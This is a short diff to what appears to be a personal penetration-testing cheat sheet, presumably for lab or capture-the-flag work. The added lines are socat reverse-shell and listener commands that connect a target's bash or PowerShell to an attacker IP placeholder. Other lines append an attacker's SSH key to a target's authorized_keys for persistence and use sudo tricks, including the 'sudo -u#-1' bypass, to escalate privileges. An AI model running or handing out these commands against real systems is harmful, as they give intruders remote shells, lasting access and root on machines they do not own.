@@ -12,8 +12,16 @@ export SHELL=bash
 export TERM=xterm-256color
 stty rows 52 columns 209 
 -----------------
-echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGQvOtGg1iFei0La62IoJcnK+JxlCF/E9XRRbox86Ufk mobin@solcoteh' >> /home/user/.ssh/authorized_keys # in target
+socat TCP-L:<port> # in our system
+socat TCP-L:<port> FILE:`tty`,raw,echo=0  # in our system
+
+socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li" # in our system for linux
+socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes # in our system for windows
+
+socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane # in target system
+-----------------
 ssh user@10.10.10.10 -i id_rsa  # in our system 
+echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGQvOtGg1iFei0La62IoJcnK+JxlCF/E9XRRbox86Ufk mobin@solcoteh' >> /home/user/.ssh/authorized_keys # in target
 -----------------
 sudo -u#-1 /bin/bash
 sudo -u silvio /usr/bin/zip # run with another user
